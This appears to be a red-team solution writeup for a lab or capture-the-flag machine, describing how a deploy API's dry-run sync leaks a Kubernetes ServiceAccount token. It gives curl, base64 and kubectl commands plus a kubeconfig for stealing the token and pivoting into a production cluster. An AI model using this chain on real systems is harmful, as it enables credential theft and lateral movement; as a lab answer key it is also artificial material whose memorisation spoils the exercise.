# solve_red.md — M5 · dev-deploy
## Red Team Solution Writeup
**Machine:** M5 — PUL Deploy Commander
**Vulnerability:** Dry-run Sync API Returns Full K8s Manifest Including ServiceAccount Token Secret
**MITRE:** T1552.001 (Credentials in Files)
**PIVOT TO:** RNG-CLD-01 (193.x.x.x:6443 Kubernetes cluster)

---
## Objective
Using the Deploy Commander API token from M4 (`dc-pul-deploy-2024-gridfall`), authenticate to the Deploy Commander API. List applications, then trigger a dry-run sync of `pul-ota-firmware`. Parse the returned K8s manifest to extract the ServiceAccount token and cluster endpoint for RNG-CLD-01.

---
## Step-by-Step

### Step 1 — Verify Token & List Applications
```bash
curl -s http://11.x.x.x:8888/api/applications \
     -H "Authorization: Bearer dc-pul-deploy-2024-gridfall" | python3 -m json.tool
```
Identifies `pul-ota-firmware` targeting `193.x.x.x:6443`.

### Step 2 — Trigger Dry-run (THE VULNERABILITY)
```bash
curl -s -X POST \
     "http://11.x.x.x:8888/api/applications/pul-ota-firmware/sync?dryRun=true" \
     -H "Authorization: Bearer dc-pul-deploy-2024-gridfall" | python3 -m json.tool
```
Response contains the full resolved K8s YAML manifest.

### Step 3 — Extract ServiceAccount Token
From the `manifest` field of the JSON response, find:
```yaml
kind: Secret
type: kubernetes.io/service-account-token
data:
  token: <BASE64_JWT_TOKEN>
  namespace: cHVsLXByb2R1Y3Rpb24=  # pul-production
```
Also find the cluster endpoint in ConfigMap:
```yaml
cluster_endpoint: "https://193.x.x.x:6443"
```

### Step 4 — Decode Token and Build Kubeconfig
```bash
echo "<BASE64_TOKEN>" | base64 -d > /tmp/sa-token.txt

# Build kubeconfig
cat > /tmp/pul-k8s-prod.kubeconfig << 'EOF'
apiVersion: v1
kind: Config
clusters:
- cluster:
    server: https://193.x.x.x:6443
    insecure-skip-tls-verify: true
  name: pul-production
contexts:
- context:
    cluster: pul-production
    user: pul-ota-deployer
    namespace: pul-production
  name: pul-production
current-context: pul-production
users:
- name: pul-ota-deployer
  user:
    token: <DECODED_SA_TOKEN>
EOF

kubectl --kubeconfig /tmp/pul-k8s-prod.kubeconfig get namespaces
```

**PIVOT:** `193.x.x.x:6443` → RNG-CLD-01 Kubernetes cluster

---
## MITRE Mapping
| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Lateral Movement | Remote Services | T1021 |
| Discovery | Cloud Service Discovery | T1526 |
